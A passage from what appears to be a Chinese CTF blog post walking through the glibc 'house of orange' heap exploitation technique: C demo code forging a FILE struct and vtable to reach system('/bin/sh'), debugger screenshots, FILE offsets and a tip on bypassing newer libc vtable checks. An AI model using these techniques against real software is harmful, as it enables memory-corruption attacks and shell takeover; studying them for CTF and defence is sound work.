fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-13"><a href="#运行结果及调试-13" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先分配一个chunk p1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540939340/0" alt="image-20210518215155746"></p><p>然后我们把top chunk的size伪造成0xc01</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540948515/0" alt="image-20210518215457813"></p><p>下面申请一个较大的chunk p2</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540950218/0" alt="image-20210518215527666"></p><p>这时候可以看到我们的旧top chunk被放入了unsorted bin中</p><p>紧接着计算IO_LIST_ALL的地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540957544/0" alt="image-20210518215758179"></p><p>将旧的top chunk的bk指针指向_IO_list_all-0x10</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540962338/0" alt="image-20210518215930176"></p><p>并且将其的前8个字节设为’/bin/sh\x00’</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540965259/0" alt="image-20210518220026228"></p><p>然后将size改为0x61</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13540992827/0" alt="image-20210518220718133"></p><p>之后程序对我们的旧top chunk做了对绕过检测的改写，先将mode改为0</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541013934/0" alt="image-20210518221251680"></p><p>然后修改_IO_write_base</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541015739/0" alt="image-20210518221322671"></p><p>然后修改_IO_write_ptr</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541018525/0" alt="image-20210518221413726"></p><p>然后修改我们的vtable，并且控制我们的jump_table</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541032639/0" alt="image-20210518221815294"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13541071688/0" alt="image-20210518223001421"></p><p>先将我们的jump_table伪造成0x40078f,然后赋值给我们的jump_table</p><p>现在再调用malloc因为会检测size,由于 size&lt;= 2*SIZE_SZ,所以会触发 _IO_flush_all_lockp 中的 _IO_OVERFLOW 函数，虽然继续报错,但我们还是 get shell了</p><h2 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h2><p>house of orange的运用一共有两个阶段</p><p>第一阶段是在不使用free的情况下获取我们的free chunk</p><p>第二个阶段是伪造我们的vtable</p><p>首先，程序写了一个winner函数，该函数作用就是调用system函数</p><p>然后程序申请了chunk p1(0x400-16)</p><p>此时系统的top chunk大小为0x20c01</p><p>因为top chunk需要页对齐并且其pre_inuse标志位始终为1，因此我们将size改成0xc01</p><p>现在申请一个0x1000的chunk，系统就会开一个新页来存储我们的新chunk，而我们的旧top chunk会被放入到unsorted bin中</p><p>有了unsorted bin，下面开始伪造file结构指针了</p><p>在第二阶段前，我们先将旧top chunk的size改为0x61</p><p>第二阶段中,程序先是把旧的top chunk-&gt;bk-&gt;fd指针指向了_io_list_ptr</p><p>为了绕过检测,我们首先要绕过两个检查</p><p>一个是mode必须为0,另一个是_write_base &lt; _write_ptr</p><p>所以程序将我们伪造的write_base改为2,write_ptr改为3</p><p>然后把我们的jump table指向winner函数，将top的前8个字节改成’/bin/sh’</p><p>最后让我们的vtable指向jump_table</p><p>现在再次调用malloc函数,由于size无法通过检测,因此,程序会终止调用,从而触发我们构造好的链</p><p>于是,程序输出错误信息的同时,我们也拿到了shell</p><p>几个疑惑的点：</p><p>关于0x61，在我们malloc之后，会在main_arena属于0x61大小的地方写上一个地址，就比如下图的0x602400</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542337892/0" alt="image-20210519112041292"></p><p>为什么要在那个地方写个地址呢，因为我们在旧的top chunk的bk写上了_IO_list_all，这样malloc之后就会把IO_list_all的地址改成main_arena+88</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542523398/0" alt="image-20210519120656219"></p><p>改完之后，这样对应的chain字段就会刚好是我们写了0x602400的地方，chain字段表示下一个IO结构</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542526522/0" alt="image-20210519120748496"></p><p>在这个结构中，我们已经伪造好了我们需要的数据，vtable等等</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542530059/0" alt="image-20210519120854705"></p><p>因为最后会触发IO_OVERFLOW函数，所以我们要在对应位置覆盖上我们的winner函数，IO_OVERFLOW应该是第4个(对应偏移下面会给出)，所以我们覆盖成如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13542537415/0" alt="image-20210519121126962"></p><p>偏移：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><p>vtable：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// &quot;extra word&quot;</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在libc版本&gt;2.23后虽然加了检测机制,但我们依旧可以通过改 vtable为 _IO_str_jump来绕过检测,将偏移0xe0处设置为one_gadget即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前置&quot;&gt;&lt;a href=&quot;#前置&quot; class=&quot;headerlink&quot; title=&quot;前置&quot;&gt;&lt;/a&gt;前置&lt;/h1&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
</feed>
